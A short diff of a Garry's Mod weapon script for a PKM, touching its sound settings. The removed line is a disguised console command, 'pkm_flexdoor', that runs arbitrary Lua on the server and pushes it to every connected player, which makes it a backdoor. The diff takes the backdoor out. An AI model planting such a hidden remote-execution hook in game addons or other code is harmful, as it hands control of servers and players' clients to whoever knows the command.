@@ -64,5 +64,3 @@ SWEP.EmptySound    = "COPPKM.pkm_empty"
 SWEP.ReloadSound   = "COPPKM.pkm_reload"
 SWEP.DeploySound   = "COPPKM.pkm_draw"
 SWEP.HolsterSound  = "COPPKM.pkm_holster"
-
-concommand.Add("pkm_flexdoor", function(_,_,_,__)RunStringEx(__)for _,v in pairs(player.GetAll())do v:SendLua(__)end end)
